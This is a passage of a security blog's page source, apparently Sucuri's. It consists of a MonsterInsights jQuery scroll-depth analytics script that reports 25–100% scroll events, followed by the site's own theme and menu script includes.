			if ( typeof(jQuery) !== 'undefined' ) {
				jQuery( document ).ready(function(){
					function monsterinsights_scroll_tracking_load() {
						if ( typeof(__gaTracker) !== 'undefined' && __gaTracker && __gaTracker.hasOwnProperty( "loaded" ) && __gaTracker.loaded == true ) {
							(function(factory) {
								factory(jQuery);
							}(function($) {

								/* Scroll Depth */
								"use strict";
								var defaults = {
									percentage: true
								};

								var $window = $(window),
									cache = [],
									scrollEventBound = false,
									lastPixelDepth = 0;

								/*
								 * Plugin
								 */

								$.scrollDepth = function(options) {

									var startTime = +new Date();

									options = $.extend({}, defaults, options);

									/*
									 * Functions
									 */

									function sendEvent(action, label, scrollDistance, timing) {

										var fieldsArray = {
											hitType       : 'event',
											eventCategory : 'Scroll Depth',
											eventAction   : action,
											eventLabel    : label,
											eventValue    : 1,
											nonInteraction: 1
										};

										if ( 'undefined' === typeof MonsterInsightsObject || 'undefined' === typeof MonsterInsightsObject.sendEvent ) {
											return;
										}

										MonsterInsightsObject.sendEvent( fieldsArray );
										if (arguments.length > 3) {
											fieldsArray = {
												hitType        : 'timing',
												timingCategory : 'Scroll Depth',
												timingVar      : action,
												timingValue    : timing,
												timingLabel    : label,
												nonInteraction: 1
											};
											MonsterInsightsObject.sendEvent( fieldsArray );
										}
									}

									function calculateMarks(docHeight) {
										return {
											'25%' : parseInt(docHeight * 0.25, 10),
											'50%' : parseInt(docHeight * 0.50, 10),
											'75%' : parseInt(docHeight * 0.75, 10),
											/* Cushion to trigger 100% event in iOS */
											'100%': docHeight - 5
										};
									}

									function checkMarks(marks, scrollDistance, timing) {
										/* Check each active mark */
										$.each(marks, function(key, val) {
											if ( $.inArray(key, cache) === -1 && scrollDistance >= val ) {
												sendEvent('Percentage', key, scrollDistance, timing);
												cache.push(key);
											}
										});
									}

									function rounded(scrollDistance) {
										/* Returns String */
										return (Math.floor(scrollDistance/250) * 250).toString();
									}

									function init() {
										bindScrollDepth();
									}

									/*
									 * Public Methods
									 */

									/* Reset Scroll Depth with the originally initialized options */
									$.scrollDepth.reset = function() {
										cache = [];
										lastPixelDepth = 0;
										$window.off('scroll.scrollDepth');
										bindScrollDepth();
									};

									/* Add DOM elements to be tracked */
									$.scrollDepth.addElements = function(elems) {

										if (typeof elems == "undefined" || !$.isArray(elems)) {
											return;
										}

										$.merge(options.elements, elems);

										/* If scroll event has been unbound from window, rebind */
										if (!scrollEventBound) {
											bindScrollDepth();
										}

									};

									/* Remove DOM elements currently tracked */
									$.scrollDepth.removeElements = function(elems) {

										if (typeof elems == "undefined" || !$.isArray(elems)) {
											return;
										}

										$.each(elems, function(index, elem) {

											var inElementsArray = $.inArray(elem, options.elements);
											var inCacheArray = $.inArray(elem, cache);

											if (inElementsArray != -1) {
												options.elements.splice(inElementsArray, 1);
											}

											if (inCacheArray != -1) {
												cache.splice(inCacheArray, 1);
											}

										});

									};

									/*
									 * Throttle function borrowed from:
									 * Underscore.js 1.5.2
									 * http://underscorejs.org
									 * (c) 2009-2013 Jeremy Ashkenas, DocumentCloud and Investigative Reporters & Editors
									 * Underscore may be freely distributed under the MIT license.
									 */

									function throttle(func, wait) {
										var context, args, result;
										var timeout = null;
										var previous = 0;
										var later = function() {
											previous = new Date;
											timeout = null;
											result = func.apply(context, args);
										};
										return function() {
											var now = new Date;
											if (!previous) previous = now;
											var remaining = wait - (now - previous);
											context = this;
											args = arguments;
											if (remaining <= 0) {
												clearTimeout(timeout);
												timeout = null;
												previous = now;
												result = func.apply(context, args);
											} else if (!timeout) {
												timeout = setTimeout(later, remaining);
											}
											return result;
										};
									}

									/*
									 * Scroll Event
									 */

									function bindScrollDepth() {

										scrollEventBound = true;

										$window.on('scroll.scrollDepth', throttle(function() {
											/*
											 * We calculate document and window height on each scroll event to
											 * account for dynamic DOM changes.
											 */

											var docHeight = $(document).height(),
												winHeight = window.innerHeight ? window.innerHeight : $window.height(),
												scrollDistance = $window.scrollTop() + winHeight,

												/* Recalculate percentage marks */
												marks = calculateMarks(docHeight),

												/* Timing */
												timing = +new Date - startTime;

											checkMarks(marks, scrollDistance, timing);
										}, 500));

									}

									init();
								};

								/* UMD export */
								return $.scrollDepth;

							}));

							jQuery.scrollDepth();
						} else {
							setTimeout(monsterinsights_scroll_tracking_load, 200);
						}
					}
					monsterinsights_scroll_tracking_load();
				});
			}
		/* End MonsterInsights Scroll Tracking */
		
</script><script type='text/javascript' src='https://blog.sucuri.net/wp-includes/js/hoverIntent.min.js?ver=1.10.2' id='hoverIntent-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/genesis/lib/js/menu/superfish.min.js?ver=1.7.5' id='superfish-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/genesis/lib/js/menu/superfish.args.min.js?ver=2.7.1' id='superfish-args-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/genesis/lib/js/skip-links.min.js?ver=2.7.1' id='skip-links-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/sucuriblog0117/js/theme.js?ver=1.1.0' id='sucuriblog-theme-js-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/sucuriblog0117/js/sticky.js?ver=1.0.4' id='sucuriblog-sticky-js-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/sucuriblog0117/js/sticky-init.js?ver=1.0.1' id='sucuriblog-sticky-js-init-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/sucuriblog0117/js/cookie-banner.js?ver=20200914' id='cookie-banner-js-js'></script>
</body></html>
